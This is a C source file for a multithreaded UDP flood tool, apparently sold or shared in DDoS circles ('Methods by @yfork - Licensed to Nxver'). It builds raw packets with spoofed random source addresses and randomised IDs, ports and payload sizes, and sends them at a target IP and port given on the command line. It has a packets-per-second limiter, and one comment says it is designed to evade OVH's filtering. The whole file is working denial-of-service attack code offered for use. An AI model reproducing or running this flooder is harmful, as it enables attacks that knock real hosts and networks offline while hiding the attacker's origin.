#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
char payload[1000];

void init_rand(unsigned long int x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++)
	{
		Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
	}
}

unsigned long int rand_cmwc(void)
{
	unsigned long long int t, a = 18782LL;
	static unsigned long int i = 4095;
	unsigned long int x, r = 0xfffffffe;
	i = (i + 1) &4095;
	t = a *Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c)
	{
		x++;
		c++;
	}

	return (Q[i] = r - x);
}

int randnum(int min_num, int max_num)
{
	int result = 0, low_num = 0, hi_num = 0;

	if (min_num < max_num)
	{
		low_num = min_num;
		hi_num = max_num + 1;	// include max_num in output
	}
	else
	{
		low_num = max_num + 1;	// include max_num in output
		hi_num = min_num;
	}

	//    srand(time(NULL)); we already have it initialized in init_rand, also OVH is a bitch and they recognize random numbers generated by time
	result = (rand_cmwc() % (hi_num - low_num)) + low_num;
	return result;
}

unsigned short csum(unsigned short *buf, int count)
{
	register unsigned long sum = 0;
	while (count > 1)
	{
		sum += *buf++;
		count -= 2;
	}

	if (count > 0)
	{
		sum += *(unsigned char *) buf;
	}

	while (sum >> 16)
	{
		sum = (sum & 0xffff) + (sum >> 16);
	}

	return (unsigned short)(~sum);
}

unsigned short int checksum(unsigned short int *addr, int len)
{
	int nleft = len;
	int sum = 0;
	unsigned short int *w = addr;
	unsigned short int answer = 0;

	while (nleft > 1)
	{
		sum += *w++;
		nleft -= sizeof(unsigned short int);
	}

	if (nleft == 1)
	{
		*(unsigned char *)(&answer) = *(unsigned char *) w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	answer = ~sum;
	return (answer);
}

unsigned short int udp4_checksum(struct iphdr *iph, struct udphdr *udph, unsigned char *payload, int payloadlen)
{
	char buf[IP_MAXPACKET];
	char *ptr;
	int chksumlen = 0;
	int i;

	ptr = &buf[0];

	memcpy(ptr, &iph->saddr, sizeof(iph->saddr));
	ptr += sizeof(iph->saddr);
	chksumlen += sizeof(iph->saddr);

	memcpy(ptr, &iph->daddr, sizeof(iph->daddr));
	ptr += sizeof(iph->daddr);
	chksumlen += sizeof(iph->daddr);

	*ptr = 0;
	ptr++;
	chksumlen += 1;

	memcpy(ptr, &iph->protocol, sizeof(iph->protocol));
	ptr += sizeof(iph->protocol);
	chksumlen += sizeof(iph->protocol);

	memcpy(ptr, &udph->len, sizeof(udph->len));
	ptr += sizeof(udph->len);
	chksumlen += sizeof(udph->len);

	memcpy(ptr, &udph->source, sizeof(udph->source));
	ptr += sizeof(udph->source);
	chksumlen += sizeof(udph->source);

	memcpy(ptr, &udph->dest, sizeof(udph->dest));
	ptr += sizeof(udph->dest);
	chksumlen += sizeof(udph->dest);

	memcpy(ptr, &udph->len, sizeof(udph->len));
	ptr += sizeof(udph->len);
	chksumlen += sizeof(udph->len);

	*ptr = 0;
	ptr++;
	*ptr = 0;
	ptr++;
	chksumlen += 2;

	memcpy(ptr, payload, payloadlen);
	ptr += payloadlen;
	chksumlen += payloadlen;

	for (i = 0; i < payloadlen % 2; i++, ptr++)
	{
		*ptr = 0;
		ptr++;
		chksumlen++;
	}

	return checksum((unsigned short int *) buf, chksumlen);
}

void setup_ip_header(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 6;
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;
	iph->saddr = inet_addr("192.168.3.100");
}

void setup_udp_header(struct udphdr *udph)
{
	udph->source = htons(5678);
	udph->check = 0;
	udph->len = htons(sizeof(struct udphdr) + 100);
}

void *payloadhandler(void *par1)
{
	while (1)
	{
		int i;
		for (i = 0; i < 1000; i++)
		{
			payload[i] = rand() % 127;
			usleep(10);
		}

		usleep(10);
	}
}

void *flood(void *par1)
{
	sleep(1);
	fprintf(stdout, "Thread waits for String generation...\n");
	char *td = (char*) par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *) datagram;
	struct udphdr *udph = (void*) iph + sizeof(struct iphdr);
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(floodport);
	sin.sin_addr.s_addr = inet_addr(td);
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
	if (s < 0)
	{
		fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}

	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setup_udp_header(udph);
	udph->dest = htons(floodport);
	iph->daddr = sin.sin_addr.s_addr;
	iph->check = csum((unsigned short *) datagram, iph->tot_len);
	int tmp = 1;
	const int *val = &tmp;
	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
	{
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}

	init_rand(time(NULL));
	register unsigned int i;
	i = 0;
	while (1)
	{
		int okgotcha;
		udph->check = 0;
                
	        okgotcha = randnum(8, 64);

		char payloadsexy[1001];
		strncpy(payloadsexy, payload, okgotcha);
		payloadsexy[okgotcha] = '\0';
		memcpy((void*) udph + sizeof(struct udphdr), (const char *) payloadsexy, okgotcha);
		iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + okgotcha;
		udph->dest = htons(floodport);
		udph->len = htons(sizeof(struct udphdr) + okgotcha);
		iph->saddr = (rand_cmwc() >> 24 &0xFF) << 24 | (rand_cmwc() >> 16 &0xFF) << 16 | (rand_cmwc() >> 8 &0xFF) << 8 | (rand_cmwc() &0xFF);
		iph->id = htonl(rand_cmwc() &0xFFFFFFFF);
		iph->check = csum((unsigned short *) datagram, iph->tot_len);
		udph->source = htons(rand_cmwc() &0xFFFF);
		udph->check = udp4_checksum(iph, udph, payloadsexy, okgotcha);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
		pps++;
		if (i >= limiter)
		{
			i = 0;
			usleep(sleeptime);
		}

		i++;
	}
}

int main(int argc, char *argv[])
{
	if (argc < 6)
	{
		fprintf(stdout, "Usage: %s <target IP> <port> <threads> <pps limiter, -1 for no limit> <time>\nMethods by @yfork - Licensed to Nxver\n", argv[0]);
		exit(-1);
	}

	fprintf(stdout, "Setting up Sockets...\n");
	srand(time(NULL));
	int num_threads = atoi(argv[3]);
	floodport = atoi(argv[2]);
	int maxpps = atoi(argv[4]);
	limiter = 0;
	pps = 0;
	pthread_t thread[num_threads];
	pthread_t stringgen[1];
	int multiplier = 20;
	int i;
	for (i = 0; i < num_threads; i++)
	{
		pthread_create(&thread[i], NULL, &flood, (void*) argv[1]);
	}

	pthread_create(&stringgen[0], NULL, &payloadhandler, (void*) argv[1]);
	fprintf(stdout, "Starting Flood...\n");
	for (i = 0; i < (atoi(argv[5]) *multiplier); i++)
	{
		usleep((1000 / multiplier) *1000);
		if ((pps *multiplier) > maxpps)
		{
			if (1 > limiter)
			{
				sleeptime += 100;
			}
			else
			{
				limiter--;
			}
		}
		else
		{
			limiter++;
			if (sleeptime > 25)
			{
				sleeptime -= 25;
			}
			else
			{
				sleeptime = 0;
			}
		}

		pps = 0;
	}

	return 0;
}